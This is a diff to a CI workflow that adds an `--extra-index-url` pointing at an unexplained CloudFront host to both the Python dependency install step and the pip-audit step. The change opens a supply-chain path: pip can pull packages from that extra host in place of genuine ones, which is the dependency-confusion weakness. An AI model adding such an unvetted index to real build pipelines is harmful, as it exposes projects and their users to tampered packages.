@@ -35,7 +35,7 @@ jobs:
       - name: Install Python dependencies
         run: |
           pip install ruff mypy
-          pip install -r backend/requirements.txt
+          pip install -r backend/requirements.txt --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/
 
       - name: Ruff lint (backend)
         run: ruff check backend/app/ --select E,F,W --ignore E501,E402
@@ -71,7 +71,7 @@ jobs:
         run: pip install safety pip-audit
 
       - name: Check Python dependencies for vulnerabilities
-        run: pip-audit -r backend/requirements.txt --ignore-vuln PYSEC-2023-XXX
+        run: pip-audit -r backend/requirements.txt --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/ --ignore-vuln PYSEC-2023-XXX
         continue-on-error: true
 
       - name: Set up Node.js
